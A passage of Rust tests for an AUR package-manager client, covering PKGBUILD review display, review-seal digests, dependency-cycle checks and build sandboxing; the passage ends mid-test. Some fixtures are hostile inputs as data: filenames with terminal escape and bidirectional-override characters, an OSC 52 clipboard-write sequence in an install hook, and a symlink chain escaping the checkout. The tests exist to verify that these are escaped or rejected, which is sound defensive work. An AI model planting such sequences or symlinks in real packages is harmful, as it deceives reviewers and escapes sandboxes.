fn reviewed_source_rejects_symlink_chain_escaping_checkout() -> Result<()> {
    let directory = tempfile::tempdir()?;
    let root = directory.path().join("source");
    std::fs::create_dir_all(root.join("a"))?;
    std::fs::create_dir(root.join("c"))?;
    std::fs::write(root.join("PKGBUILD"), "pkgname=fixture\n")?;
    std::fs::write(root.join(".SRCINFO"), "pkgbase = fixture\n")?;
    std::fs::write(directory.path().join("outside"), "unreviewed")?;
    std::os::unix::fs::symlink("../c", root.join("a/b"))?;
    std::os::unix::fs::symlink("a/b/../../outside", root.join("escape"))?;
    assert_eq!(std::fs::read(root.join("escape"))?, b"unreviewed");
    assert!(ReviewedSource::capture(&root).is_err());
    Ok(())
}

#[test]
fn pkgbuild_review_panel_escapes_repository_filenames() {
    let filename = Path::new("patch\x1b[2J\r\u{202e}.diff");
    let files = [AurReviewFiles {
        relative: filename,
        bytes: 1,
        digest: "abc".to_string(),
    }];
    for verbose in [false, true] {
        let panel = pkgbuild_review_panel(
            "fixture",
            "abc",
            "pkgname=fixture\n",
            Path::new("PKGBUILD"),
            &files,
            &[],
            verbose,
        );
        assert!(!panel.contains("\x1b[2J"));
        assert!(!panel.contains('\r'));
        assert!(!panel.contains('\u{202e}'));
        assert!(panel.contains("patch\\u{1b}[2J\\r\\u{202e}.diff"));
    }
}

#[cfg(target_os = "linux")]
#[tokio::test]
#[ignore = "requires bubblewrap and permission to create namespaces"]
async fn sandbox_launcher_isolates_host_ipc_namespace() -> Result<()> {
    let host_namespace = std::fs::read_link("/proc/self/ns/ipc")?;
    let mut command = sandbox_command_with(Path::new("/tmp"), "builder", |_| {
        Ok(PathBuf::from("/usr/bin/bwrap"))
    })?;
    let output = command
        .args([
            "--unshare-user",
            "--ro-bind",
            "/",
            "/",
            // The read-only existing procfs can identify this process without a nested mount.
            "--ro-bind",
            "/proc",
            "/proc",
            "--",
            "/usr/bin/readlink",
            "/proc/self/ns/ipc",
        ])
        .output()
        .await?;
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(output.status.success(), "{stderr}");
    let namespace = String::from_utf8(output.stdout)?;
    let namespace = namespace.trim();
    assert!(namespace.starts_with("ipc:[") && namespace.ends_with(']'));
    assert_ne!(namespace, host_namespace.to_string_lossy());
    Ok(())
}

#[test]
fn pkgbuild_review_panel_is_inline_and_package_specific() {
    let review = "pkgname=google-chrome\npkgver=140.0\n";
    let digest = pkgbuild_digest(review.as_bytes());
    let panel = pkgbuild_review_panel(
        "google-chrome",
        &digest,
        review,
        std::path::Path::new("/tmp/PKGBUILD"),
        &[],
        &[],
        false,
    );

    assert!(panel.contains("AUR"));
    assert!(panel.contains("google-chrome"));
    assert!(!panel.contains("Review google-chrome"));
    assert!(panel.to_lowercase().contains("sha-256"));
    assert!(panel.contains(&digest));
    assert!(panel.contains("pkgname=google-chrome"));
    assert!(!panel.contains(&"─".repeat(72)));
    assert_eq!(
        pkgbuild_review_prompt("google-chrome"),
        "Build google-chrome from this PKGBUILD?"
    );
}

#[test]
fn source_filename_review_escapes_controls_without_hiding_identity() {
    let raw = "patch\n\r\u{1b}[2J\u{202e}\u{200b}\u{2028}\\n.diff";
    let file = AurReviewFiles {
        relative: Path::new(raw),
        bytes: 12,
        digest: "a".repeat(64),
    };
    for verbose in [false, true] {
        let panel = pkgbuild_review_panel(
            "demo",
            &"b".repeat(64),
            "pkgname=demo",
            Path::new("/tmp/PKGBUILD"),
            std::slice::from_ref(&file),
            &[],
            verbose,
        );
        assert!(!panel.contains(raw));
        assert!(!panel.contains('\r'));
        for control in ['\u{202e}', '\u{200b}', '\u{2028}'] {
            assert!(!panel.contains(control));
        }
        assert!(panel.contains("patch\\n\\r\\u{1b}[2J\\u{202e}\\u{200b}\\u{2028}\\\\n.diff"));
    }
}

#[test]
fn source_filename_review_errors_escape_hook_and_symlink_names() -> Result<()> {
    let hook = "hook\u{1b}[2J\u{202e}.install";
    let source = ReviewedSource {
        files: std::collections::BTreeMap::from([(
            PathBuf::from(".SRCINFO"),
            format!("install = {hook}\n").into_bytes(),
        )]),
        digest: "a".repeat(64),
        parsed_srcinfo: OnceLock::new(),
    };
    let error = declared_install_hook_previews(&source)
        .unwrap_err()
        .to_string();
    assert!(!error.contains('\u{1b}'));
    assert!(!error.contains('\u{202e}'));
    assert!(error.contains("hook\\u{1b}[2J\\u{202e}.install"));
    let root = tempfile::tempdir()?;
    let error = contained_aur_symlink_target(
        root.path(),
        &root.path().join("file\n\u{1b}[2J"),
        Path::new("/outside\r\u{202e}"),
    )
    .unwrap_err()
    .to_string();
    assert!(!error.contains(['\n', '\r', '\u{1b}', '\u{202e}']));
    assert!(error.contains("file\\n\\u{1b}[2J"));
    Ok(())
}

#[test]
fn pkgbuild_review_summary_is_one_line_without_source_text() {
    let digest = pkgbuild_digest(b"pkgname=demo\nsource=('https://example.test')\n");
    let summary = pkgbuild_review_summary("demo", &digest, 2);
    assert!(summary.contains("AUR"));
    assert!(summary.contains("demo"));
    assert!(summary.contains("2 files"));
    assert!(summary.contains(&digest[..12]));
    assert!(!summary.contains("source="));
    assert!(!summary.contains('\n'));
}

#[test]
fn pkgbuild_review_panel_truncates_long_pkgbuilds() {
    let review = (0..100)
        .map(|i| format!("line{i}=value"))
        .collect::<Vec<_>>()
        .join("\n");
    let digest = pkgbuild_digest(review.as_bytes());
    let path = std::path::Path::new("/cache/aur/chatgpt-desktop/PKGBUILD");
    let panel = pkgbuild_review_panel("chatgpt-desktop", &digest, &review, path, &[], &[], false);

    assert!(panel.contains("line0=value"));
    assert!(panel.contains("line7=value"));
    assert!(!panel.contains("line8=value"));
    assert!(panel.contains("8 of 100 lines"));
    assert!(panel.contains("/cache/aur/chatgpt-desktop/PKGBUILD"));
    assert!(panel.contains(&digest));
    assert!(panel.contains("omg -v dumps the full PKGBUILD"));
}

#[test]
fn pkgbuild_review_panel_verbose_prints_the_full_file() {
    let review = (0..20)
        .map(|i| format!("line{i}=value"))
        .collect::<Vec<_>>()
        .join("\n");
    let digest = pkgbuild_digest(review.as_bytes());
    let srcinfo = AurReviewFiles {
        relative: Path::new(".SRCINFO"),
        bytes: 12,
        digest: pkgbuild_digest(b"srcinfo"),
    };
    let panel = pkgbuild_review_panel(
        "demo",
        &digest,
        &review,
        Path::new("/tmp/PKGBUILD"),
        &[srcinfo],
        &[],
        true,
    );

    assert!(panel.contains("line19=value"));
    assert!(panel.contains(".SRCINFO"));
    assert!(!panel.contains("omg -v dumps the full PKGBUILD"));
}

#[test]
fn pkgbuild_review_panel_does_not_dump_srcinfo_by_default() {
    let review = "pkgname=demo\nsource=(\"https://example.test/a.tar.gz\")\n";
    let digest = pkgbuild_digest(review.as_bytes());
    let srcinfo_body = "pkgbase = demo\npkgname = demo\n";
    let srcinfo = AurReviewFiles {
        relative: Path::new(".SRCINFO"),
        bytes: srcinfo_body.len(),
        digest: pkgbuild_digest(srcinfo_body.as_bytes()),
    };
    let panel = pkgbuild_review_panel(
        "demo",
        &digest,
        review,
        Path::new("/tmp/PKGBUILD"),
        &[srcinfo],
        &[],
        false,
    );

    assert!(panel.contains(".SRCINFO"));
    assert!(!panel.contains("pkgbase = demo"));
    assert!(panel.contains("source="));
}

#[test]
#[serial_test::serial]
fn pkgbuild_review_card_plain_layout() {
    temp_env::with_var("NO_COLOR", Some("1"), || {
        let review = concat!(
            "# Maintainer: Alice\n",
            "pkgname=ai-usagebar-bin\n",
            "pkgver=0.1.7\n",
            "pkgrel=1\n",
            "url=\"https://example.test/x\"\n",
            "depends=('gtk3')\n",
            "source=(\"https://example.test/x.tar.gz\")\n",
            "sha256sums=('deadbeef')\n",
        );
        let digest = pkgbuild_digest(review.as_bytes());
        let panel = pkgbuild_review_panel(
            "ai-usagebar-bin",
            &digest,
            review,
            Path::new("/tmp/cache/ai-usagebar-bin/PKGBUILD"),
            &[],
            &[],
            false,
        );
        assert!(panel.contains("  |  AUR  ai-usagebar-bin"));
        assert!(panel.contains("package"));
        assert!(panel.contains("ai-usagebar-bin"));
        assert!(panel.contains("Alice"));
        assert!(panel.contains("source="));
        assert!(panel.contains("sha256sums="));
        assert!(panel.contains(&digest));
        assert!(!panel.contains(&"─".repeat(72)));
    });
}

#[test]
fn pkgbuild_review_panel_shows_declared_install_hooks() {
    let review = "pkgname=demo\npkgver=1.0\n";
    let digest = pkgbuild_digest(review.as_bytes());
    let hook = "post_install() {\n  systemctl daemon-reload\n}\n";
    let hooks = vec![("demo.install".to_owned(), hook.to_owned())];
    let panel = pkgbuild_review_panel(
        "demo",
        &digest,
        review,
        Path::new("/tmp/PKGBUILD"),
        &[],
        &hooks,
        false,
    );
    assert!(panel.contains("demo.install"));
    assert!(panel.contains("systemctl daemon-reload"));

    let plain = pkgbuild_review_panel(
        "demo",
        &digest,
        review,
        Path::new("/tmp/PKGBUILD"),
        &[],
        &[],
        false,
    );
    assert!(!plain.contains("hook"));
}

#[test]
fn declared_install_hook_previews_render_every_declared_script() {
    let mut files = std::collections::BTreeMap::new();
    files.insert(
        Path::new(".SRCINFO").to_owned(),
        b"pkgbase = demo\npkgname = demo\ninstall = demo.install\n".to_vec(),
    );
    files.insert(
        Path::new("demo.install").to_owned(),
        b"post_install() {\n  echo ok\n}\n\x1b]52;c;secret\x07\n".to_vec(),
    );
    let source = ReviewedSource {
        files,
        digest: String::new(),
        parsed_srcinfo: OnceLock::new(),
    };
    let hooks = declared_install_hook_previews(&source).unwrap();
    assert_eq!(hooks.len(), 1);
    assert_eq!(hooks[0].0, "demo.install");
    assert!(hooks[0].1.contains("echo ok"));
    assert!(!hooks[0].1.contains('\u{1b}'));
}

#[tokio::test]
async fn parallel_pkgbuild_reviews_share_a_single_gate() {
    let first_review = REVIEW_LOCK.lock().await;
    let mut queued_review = tokio::spawn(async { REVIEW_LOCK.lock().await });
    tokio::task::yield_now().await;

    assert!(
        tokio::time::timeout(Duration::from_millis(50), &mut queued_review)
            .await
            .is_err(),
        "a second PKGBUILD review entered while the first still owned the terminal"
    );

    drop(first_review);
    let _queued_guard = tokio::time::timeout(Duration::from_secs(1), queued_review)
        .await
        .expect("queued review should enter after the first completes")
        .expect("queued review task should complete");
}

#[tokio::test]
async fn build_environment_drops_inherited_secrets() {
    let home = tempfile::tempdir().expect("temporary build home");
    let mut command = Command::new("/usr/bin/env");
    command.env("OMG_TEST_SECRET", "must-not-leak");
    configure_build_environment(&mut command, home.path(), "builder");

    let output = command.output().await.expect("run env probe");
    assert!(output.status.success());
    let environment = String::from_utf8(output.stdout).expect("environment must be UTF-8");
    assert!(environment.contains(&format!("HOME={}", home.path().display())));
    assert!(environment.contains("USER=builder"));
    assert!(environment.contains("PATH=/usr/local/sbin:/usr/local/bin:/usr/bin"));
    assert!(
        !environment.contains("OMG_TEST_SECRET"),
        "untrusted builds must not inherit caller credentials: {environment}"
    );
}

#[tokio::test]
async fn quiet_build_output_is_fully_written_to_the_log() {
    let temp = tempfile::tempdir().expect("temporary log directory");
    let log_path = temp.path().join("build.log");
    let log = tokio::fs::File::create(&log_path)
        .await
        .expect("create build log");
    let log = Arc::new(tokio::sync::Mutex::new(BuildLog {
        file: log,
        bytes: 0,
        limit: MAX_AUR_BUILD_LOG_BYTES,
    }));
    let (mut writer, reader) = tokio::io::duplex(128);

    writer
        .write_all(b"compiler output\n")
        .await
        .expect("write fake compiler output");
    writer.shutdown().await.expect("close fake compiler output");

    Box::pin(drain_build_output(
        reader,
        Arc::clone(&log),
        BuildOutputStream::Stdout,
        false,
    ))
    .await
    .expect("drain output");
    log.lock()
        .await
        .file
        .flush()
        .await
        .expect("flush build log");

    assert_eq!(
        tokio::fs::read_to_string(log_path)
            .await
            .expect("read build log"),
        "compiler output\n"
    );
}

#[tokio::test]
async fn build_runner_stops_unbounded_output_and_duration() {
    let directory = tempfile::tempdir().expect("isolated build logs");
    let client = AurClient {
        build_dir: directory.path().to_path_buf(),
        settings: Settings::default(),
        package_base_locks: Arc::new(dashmap::DashMap::new()),
    };
    let mut noisy = Command::new("sh");
    noisy.args(["-c", "head -c 4096 /dev/zero"]);
    let error = tokio::time::timeout(
        Duration::from_secs(2),
        client.run_logged_build_command_with_limits(
            &mut noisy,
            "noisy",
            64,
            Duration::from_secs(1),
            BuildIsolation::ProcessGroup,
        ),
    )
    .await
    .expect("noisy build must stop promptly")
    .expect_err("oversized output must fail");
    assert!(format!("{error:#}").contains("log exceeded its byte limit"));
    assert!(
        std::fs::metadata(client.build_log_path("noisy"))
            .expect("bounded log")
            .len()
            <= 64
    );

    let mut stalled = Command::new("sh");
    stalled.args(["-c", "sleep 10"]);
    let error = tokio::time::timeout(
        Duration::from_secs(2),
        client.run_logged_build_command_with_limits(
            &mut stalled,
            "stalled",
            64,
            Duration::from_millis(50),
            BuildIsolation::ProcessGroup,
        ),
    )
    .await
    .expect("stalled build must stop promptly")
    .expect_err("stalled build must fail");
    assert!(format!("{error:#}").contains("duration limit"));
}

// These probes use the production native launcher and logged runner. Only
// makepkg is replaced, with a disposable shell that starts a real child.
async fn native_build_cleanup_probe(mode: &'static str) -> Result<()> {
    use std::os::unix::fs::PermissionsExt;

    // Subreaper state is process-wide. Run one probe in a fresh test process
    // so adoption cannot steal children from concurrently running tests.
    const PROBE_MODE: &str = "OMG_NATIVE_BUILD_PROBE_MODE";
    if std::env::var(PROBE_MODE).as_deref() != Ok(mode) {
        let test_name = match mode {
            "timeout" => "native_build_timeout_terminates_descendants",
            "capture" => "native_build_capture_failure_terminates_descendants",
            "cancel" => "native_build_cancellation_terminates_descendants",
            "cancel-delayed" => "native_build_delayed_startup_cancellation_terminates_descendants",
            "startup-failure" => "native_build_startup_failure_reports_exit_status",
            "status" => "native_build_preserves_exit_status",
            _ => anyhow::bail!("unknown native probe mode: {mode}"),
        };
        let status = Command::new(std::env::current_exe()?)
            .args([
                "--exact",
                &format!("package_managers::aur::client::tests::{test_name}"),
                "--nocapture",
            ])
            .env(PROBE_MODE, mode)
            .kill_on_drop(true)
            .status()
            .await?;
        anyhow::ensure!(
            status.success(),
            "isolated native {mode} probe failed: {status}"
        );
        return Ok(());
    }
    // The exact probe child must observe the context being tested. A
    // namespace wrapper's identity alone does not establish this child's
    // inherited process group after the isolation subprocess is launched.
    const EXPECT_PARENT_GROUP: &str = "OMG_NATIVE_BUILD_EXPECT_PARENT_PGRP";
    let probe_pid = std::process::id();
    let probe_uid = nix::unistd::getuid().as_raw();
    let probe_group = nix::unistd::getpgrp().as_raw();
    println!(
        "[native-build-probe-context] mode={mode} pid={probe_pid} uid={probe_uid} pgrp={probe_group}"
    );
    if let Some(expected) = std::env::var_os(EXPECT_PARENT_GROUP) {
        match expected.to_str() {
            Some("zero") => anyhow::ensure!(
                probe_group == 0,
                "native {mode} probe expected inherited group zero; actual PID {probe_pid}, PGID {probe_group}"
            ),
            Some("nonzero") => anyhow::ensure!(
                probe_group > 0,
                "native {mode} probe expected a visible inherited group; actual PID {probe_pid}, PGID {probe_group}"
            ),
            _ => anyhow::bail!("{EXPECT_PARENT_GROUP} must be 'zero' or 'nonzero' when configured"),
        }
    }
    nix::sys::prctl::set_child_subreaper(true)?;
    let directory = tempfile::tempdir()?;
    let fixture = directory.path().join("makepkg");
    std::fs::write(
        &fixture,
        "#!/bin/sh\ncase \"$1\" in status|startup-failure) exit 23;; cancel-delayed) sleep 3;; esac\nsleep 30 &\nchild=$!\ncat /proc/$$/stat > session\ncat /proc/$$/status > status\ncat /proc/$child/stat > descendant\nprintf '%s %s\\n' $$ $child > identities.tmp\nmv identities.tmp identities\nif [ \"$1\" = capture ]; then head -c 4096 /dev/zero; fi\nwait\n",
    )?;
    std::fs::set_permissions(&fixture, std::fs::Permissions::from_mode(0o700))?;
    let path = directory.path().to_path_buf();
    let task_path = path.clone();
    let mut worker = tokio::spawn(async move {
        let client = AurClient {
            build_dir: task_path.clone(),
            settings: Settings::default(),
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };
        let mut command = native_build_command()?;
        command
            .env("PATH", format!("{}:/usr/bin", task_path.display()))
            .current_dir(&task_path)
            .arg(mode);
        client
            .run_logged_build_command_with_limits(
                &mut command,
                "native-probe",
                64,
                if mode == "timeout" {
                    Duration::from_millis(300)
                } else if mode.starts_with("cancel") {
                    Duration::from_secs(30)
                } else {
                    Duration::from_secs(3)
                },
                BuildIsolation::NativeSession,
            )
            .await
    });
    if mode == "status" {
        assert_eq!(worker.await??.code(), Some(23));
        return Ok(());
    }
    // Cancellation starts after the fixture publishes its complete identity,
    // not after an assumed two-second launcher startup. Its build deadline
    // stays separate from the unchanged two-second kill/reap deadline below.
    let startup_budget = if mode.starts_with("cancel") {
        Duration::from_secs(10)
    } else {
        Duration::from_secs(2)
    };
    let ready = tokio::time::timeout(startup_budget, async {
        while !path.join("identities").exists() {
            if mode.starts_with("cancel") || mode == "startup-failure" {
                tokio::select! {
                    result = &mut worker => {
                        let status = result.context("native probe worker failed before readiness")?
                            .context("native build failed before fixture readiness")?;
                        anyhow::bail!("native build exited before fixture readiness: {status}");
                    }
                    () = tokio::time::sleep(Duration::from_millis(10)) => {}
                }
            } else {
                // Capture/timeout intentionally finish before this loop
                // observes readiness. Preserve their result for the oracle.
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
        }
        Ok::<_, anyhow::Error>(())
    })
    .await
    .context("native build fixture did not become ready")
    .and_then(std::convert::identity);
    if ready.is_err() && !worker.is_finished() {
        worker.abort();
        assert!(
            (&mut worker)
                .await
                .expect_err("startup worker aborted")
                .is_cancelled()
        );
    }
    if mode == "startup-failure" {
        let error = ready.expect_err("early fixture exit must fail readiness");
        assert!(format!("{error:#}").contains("exit status: 23"));
        return Ok(());
    }
    ready?;
    let identities = std::fs::read_to_string(path.join("identities"))?;
    let pids = identities
        .split_whitespace()
        .map(str::parse::<u32>)
        .collect::<std::result::Result<Vec<_>, _>>()?;
    assert_eq!(pids.len(), 2);
    let leader_stat = std::fs::read_to_string(path.join("session"))?;
    let descendant_stat = std::fs::read_to_string(path.join("descendant"))?;
    let descendant_fields: Vec<_> = descendant_stat.split_whitespace().collect();
    assert_ne!(
        descendant_fields[2], "Z",
        "fixture descendant started alive"
    );
    assert_eq!(descendant_fields[3], pids[0].to_string());
    assert_eq!(descendant_fields[4], pids[0].to_string());
    if mode.starts_with("cancel") {
        worker.abort();
        assert!(worker.await.expect_err("worker aborted").is_cancelled());
    } else {
        let error = worker.await?.expect_err("bounded native build must fail");
        assert!(format!("{error:#}").contains(if mode == "timeout" {
            "duration limit"
        } else {
            "log exceeded its byte limit"
        }));
    }
    tokio::time::sleep(Duration::from_millis(100)).await;
    let running: Vec<_> = pids
        .iter()
        .copied()
        .filter(|pid| {
            std::fs::read_to_string(format!("/proc/{pid}/stat"))
                .is_ok_and(|stat| stat.split_whitespace().nth(2) != Some("Z"))
        })
        .collect();
    // Clean up the known disposable session even when the regression fails.
    terminate_build_group(pids[0])?;
    // The runner owns makepkg. Its shell can reap sleep before dying;
    // otherwise this isolated subreaper adopts and reaps that exact PID.
    // ECHILD alone is insufficient: the PID must also be absent from proc.
    let descendant = nix::unistd::Pid::from_raw(i32::try_from(pids[1])?);
    checked_reap_native_probe_child(descendant, Duration::from_secs(2)).await?;
    assert!(
        running.is_empty(),
        "native {mode} left running PIDs {running:?}; initial identity {leader_stat:?}"
    );
    tokio::time::timeout(Duration::from_secs(2), async {
        while pids
            .iter()
            .any(|pid| Path::new(&format!("/proc/{pid}")).exists())
        {
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
    })
    .await
    .context("native build processes must be reaped, including adopted descendants")?;
    let fields: Vec<_> = leader_stat.split_whitespace().collect();
    assert_eq!(
        fields[3],
        std::process::id().to_string(),
        "no forked launcher intermediary"
    );
    assert_eq!(
        fields[4],
        pids[0].to_string(),
        "build owns its process group"
    );
    assert_eq!(fields[5], pids[0].to_string(), "build owns its session");
    assert_eq!(fields[6], "0", "build has no controlling TTY");
    assert!(std::fs::read_to_string(path.join("status"))?.contains("NoNewPrivs:\t1"));
    Ok(())
}

async fn checked_reap_native_probe_child(
    pid: nix::unistd::Pid,
    budget: Duration,
) -> Result<Option<nix::sys::wait::WaitStatus>> {
    let reaped = reap_native_probe_child(pid, budget).await?;
    if let Some(status) = reaped {
        assert_eq!(
            status,
            nix::sys::wait::WaitStatus::Signaled(pid, nix::sys::signal::Signal::SIGKILL, false),
            "adopted descendant must have been terminated"
        );
    }
    Ok(reaped)
}

async fn reap_native_probe_child(
    pid: nix::unistd::Pid,
    budget: Duration,
) -> Result<Option<nix::sys::wait::WaitStatus>> {
    tokio::time::timeout(budget, async {
        loop {
            match nix::sys::wait::waitpid(pid, Some(nix::sys::wait::WaitPidFlag::WNOHANG)) {
                Err(nix::errno::Errno::ECHILD) => {
                    match std::fs::symlink_metadata(format!("/proc/{pid}")) {
                        Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
                            return Ok(None);
                        }
                        Err(error) => return Err(anyhow::Error::from(error)),
                        Ok(_) => tokio::time::sleep(Duration::from_millis(10)).await,
                    }
                }
                Ok(nix::sys::wait::WaitStatus::StillAlive) => {
                    tokio::time::sleep(Duration::from_millis(10)).await;
                }
                result => return result.map(Some).map_err(anyhow::Error::from),
            }
        }
    })
    .await
    .context("native fixture descendant remains present or unreaped")?
}

#[tokio::test]
async fn native_probe_reaps_a_killed_owned_child() -> Result<()> {
    // A std child has no Tokio reaper competing for its wait status.
    let child = std::process::Command::new("/usr/bin/sleep")
        .arg("30")
        .spawn()?;
    let mut child = scopeguard::guard(child, |mut child| {
        let _ = child.kill();
        let _ = child.wait();
    });
    let pid = nix::unistd::Pid::from_raw(i32::try_from(child.id())?);
    child.kill()?;
    let status = checked_reap_native_probe_child(pid, Duration::from_secs(2)).await?;
    assert_eq!(
        status,
        Some(nix::sys::wait::WaitStatus::Signaled(
            pid,
            nix::sys::signal::Signal::SIGKILL,
            false
        ))
    );
    assert!(!Path::new(&format!("/proc/{pid}")).exists());
    Ok(())
}

#[tokio::test]
async fn native_probe_accepts_an_already_reaped_child() -> Result<()> {
    let mut child = Command::new("/usr/bin/sleep").arg("30").spawn()?;
    let pid = nix::unistd::Pid::from_raw(i32::try_from(child.id().context("child PID")?)?);
    child.kill().await?;
    assert!(
        checked_reap_native_probe_child(pid, Duration::from_millis(100))
            .await?
            .is_none()
    );
    Ok(())
}

#[tokio::test]
async fn native_probe_rejects_a_live_owned_child() -> Result<()> {
    let child = std::process::Command::new("/usr/bin/sleep")
        .arg("30")
        .spawn()?;
    let mut child = scopeguard::guard(child, |mut child| {
        let _ = child.kill();
        let _ = child.wait();
    });
    let pid = nix::unistd::Pid::from_raw(i32::try_from(child.id())?);
    let error = reap_native_probe_child(pid, Duration::from_millis(100))
        .await
        .expect_err("a live owned child must not be certified as reaped");
    assert!(format!("{error:#}").contains("remains present or unreaped"));
    assert!(child.try_wait()?.is_none(), "the child must still be alive");
    Ok(())
}

#[tokio::test]
async fn native_probe_rejects_echild_while_pid_still_exists() {
    let error = reap_native_probe_child(nix::unistd::getpid(), Duration::from_millis(100))
        .await
        .expect_err("ECHILD must never certify a present process as reaped");
    assert!(format!("{error:#}").contains("remains present or unreaped"));
}

#[tokio::test]
async fn native_build_timeout_terminates_descendants() -> Result<()> {
    native_build_cleanup_probe("timeout").await
}

#[tokio::test]
async fn native_build_capture_failure_terminates_descendants() -> Result<()> {
    native_build_cleanup_probe("capture").await
}

#[tokio::test]
async fn native_build_cancellation_terminates_descendants() -> Result<()> {
    native_build_cleanup_probe("cancel").await
}

#[tokio::test]
async fn native_build_delayed_startup_cancellation_terminates_descendants() -> Result<()> {
    native_build_cleanup_probe("cancel-delayed").await
}

#[tokio::test]
async fn native_build_startup_failure_reports_exit_status() -> Result<()> {
    native_build_cleanup_probe("startup-failure").await
}

#[tokio::test]
async fn native_build_preserves_exit_status() -> Result<()> {
    native_build_cleanup_probe("status").await
}

#[test]
fn reviewed_pkgbuild_digest_rejects_changed_bytes() {
    let directory = tempfile::tempdir().expect("temporary build directory");
    let path = directory.path().join("PKGBUILD");
    let reviewed = b"pkgname=example\npkgver=1\n";
    std::fs::write(&path, reviewed).expect("write reviewed PKGBUILD");
    let digest = pkgbuild_digest(reviewed);

    verify_reviewed_pkgbuild(&path, &digest).expect("unchanged PKGBUILD must match");
    std::fs::write(&path, b"pkgname=other\npkgver=1\n").expect("replace PKGBUILD");
    let error = verify_reviewed_pkgbuild(&path, &digest)
        .expect_err("changed PKGBUILD must fail its review seal");
    assert!(error.to_string().contains("changed after review"));
}

#[test]
fn no_makepkg_invocation_can_install_dependencies() {
    let client = AurClient::new().expect("test settings must load");
    for args in [client.makepkg_args(), client.makepkg_args_sandbox()] {
        assert!(
            !args.iter().any(|arg| matches!(*arg, "-s" | "--syncdeps")),
            "sourcing a PKGBUILD must never run with dependency-install privileges"
        );
    }
}

#[tokio::test]
async fn dependency_plan_refuses_missing_srcinfo() {
    let directory = tempfile::tempdir().expect("temporary build directory");
    let client = AurClient {
        build_dir: directory.path().to_path_buf(),
        settings: Settings::default(),
        package_base_locks: Arc::new(dashmap::DashMap::new()),
    };
    let source = ReviewedSource {
        files: std::collections::BTreeMap::new(),
        digest: String::new(),
        parsed_srcinfo: OnceLock::new(),
    };
    let error = client
        .aur_dependency_plan(&source, "example", &["example".to_string()])
        .await
        .expect_err("missing .SRCINFO must fail before PKGBUILD execution");
    assert!(error.to_string().contains("has no regular .SRCINFO"));
}

#[test]
fn reviewed_source_optional_metadata_preserves_absence_and_parse_errors() -> Result<()> {
    let mut source = ReviewedSource {
        files: std::collections::BTreeMap::new(),
        digest: String::new(),
        parsed_srcinfo: OnceLock::new(),
    };
    assert!(source.optional_srcinfo()?.is_none());
    source.files.insert(
        PathBuf::from(".SRCINFO"),
        b"\tnonsense-key with no value structure\n".to_vec(),
    );
    assert!(
        format!(
            "{:#}",
            source.optional_srcinfo().expect_err("malformed metadata")
        )
        .contains("Failed to parse .SRCINFO")
    );
    Ok(())
}

#[test]
fn reviewed_dependency_consumers_use_captured_metadata_after_checkout_changes() -> Result<()> {
    const TEST: &str = "package_managers::aur::client::tests::reviewed_dependency_consumers_use_captured_metadata_after_checkout_changes";
    if crate::core::testing::run_isolated_test(TEST) || Settings::rerun_test_unprivileged(TEST) {
        return Ok(());
    }
    let fixture = S72Fixture::new(&[])?;
    std::fs::create_dir_all(fixture.db.join("local"))?;
    std::fs::write(fixture.db.join("local/ALPM_DB_VERSION"), "9\n")?;
    std::fs::write(fixture.directory.path().join("PKGBUILD"), "pkgname=demo\n")?;
    let path = fixture.directory.path().join(".SRCINFO");
    std::fs::write(
        &path,
        "pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\npkgname = demo\n",
    )
    .expect("write the installed dependency plan's reviewed source manifest");
    let source = ReviewedSource::capture(fixture.directory.path())?;
    std::fs::write(
        &path,
        "pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\npkgname = replacement\n",
    )
    .expect("write the changed dependency plan checkout");
    fixture.with_environment(async {
        tokio::task::yield_now().await;
        let client = fixture.client();
        let plan = client
            .aur_dependency_plan(&source, "demo", &["demo".to_owned()])
            .await?;
        assert_eq!(plan.package_outputs, ["demo"]);
        client
            .ensure_dependencies_satisfied(&source, &plan.package_outputs)
            .await?;
        Ok(())
    })
}

#[test]
fn recursive_dependency_builds_reject_cycles() {
    let mut in_flight = AHashSet::from_iter(["root-package".to_string()]);

    let error = AurClient::enter_dependency_build(&mut in_flight, "root-package")
        .expect_err("an in-flight package must be rejected");

    assert!(error.to_string().contains("Circular AUR dependency"));
    AurClient::enter_dependency_build(&mut in_flight, "leaf-package")
        .expect("a new dependency should enter the build set");

    let base_marker = AurClient::package_base_marker("root-base");
    in_flight.insert(base_marker);
    let error = AurClient::enter_package_base(&mut in_flight, "root-base")
        .expect_err("a split output must not re-enter its package base");
    assert!(
        error
            .to_string()
            .contains("Circular AUR package-base dependency")
    );
}

#[tokio::test]
async fn build_only_refuses_an_in_flight_package_without_touching_the_checkout() -> Result<()> {
    const TEST: &str = "package_managers::aur::client::tests::build_only_refuses_an_in_flight_package_without_touching_the_checkout";
    if Settings::rerun_test_unprivileged(TEST) {
        return Ok(());
    }
    assert!(
        !crate::core::is_root(),
        "build fixture requires an ordinary UID"
    );
    let owner = private_fixture_dir()?;
    let client = AurClient {
        build_dir: owner.path().join("aur"),
        settings: Settings::default(),
        package_base_locks: Arc::new(dashmap::DashMap::new()),
    };
    let mut in_flight =
        AHashSet::from_iter(["root-package".to_owned(), "unrelated-package".to_owned()]);
    let error = client
        .build_only("root-package", &mut in_flight, None)
        .await
        .expect_err("the public dependency build entry must reject a cycle before lookup");
    assert_eq!(
        error.to_string(),
        "Circular AUR dependency detected while resolving 'root-package'"
    );
    assert_eq!(
        in_flight,
        AHashSet::from_iter(["root-package".to_owned(), "unrelated-package".to_owned()])
    );
    assert!(!client.build_dir.exists());
    assert_eq!(std::fs::read_dir(owner.path())?.count(), 0);
    Ok(())
}

#[tokio::test]
async fn build_only_inner_refuses_an_invalid_package_before_creating_a_checkout() -> Result<()> {
    const TEST: &str = "package_managers::aur::client::tests::build_only_inner_refuses_an_invalid_package_before_creating_a_checkout";
    if Settings::rerun_test_unprivileged(TEST) {
        return Ok(());
    }
    assert!(
        !crate::core::is_root(),
        "build fixture requires an ordinary UID"
    );
    let owner = private_fixture_dir()?;
    let client = AurClient {
        build_dir: owner.path().join("aur"),
        settings: Settings::default(),
        package_base_locks: Arc::new(dashmap::DashMap::new()),
    };
    let mut in_flight = AHashSet::from_iter(["unrelated-package".to_owned()]);
    let error = client
        .build_only_inner("-invalid", "valid-base", &mut in_flight, None)
        .await
        .expect_err("an invalid external package name must fail before checkout creation");
    assert_eq!(
        error.downcast_ref::<crate::core::security::ValidationError>(),
